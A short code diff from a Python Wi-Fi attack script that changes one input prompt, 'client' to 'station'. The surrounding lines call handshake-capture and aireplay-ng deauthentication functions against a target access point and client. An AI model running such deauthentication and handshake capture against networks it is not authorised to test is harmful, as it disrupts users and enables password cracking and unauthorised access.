@@ -121,7 +121,7 @@ def main():
     capture_handshake(monitor_interface, target_mac, channel, output_file)
 
     # Ask for the client MAC address to deauth
-    client_mac = input("Enter the MAC address of the client to deauth: ")
+    client_mac = input("Enter the MAC address of the station to deauth: ")
 
     # Perform deauthentication attack using aireplay-ng
     deauth_attack(monitor_interface, target_mac, client_mac, channel)
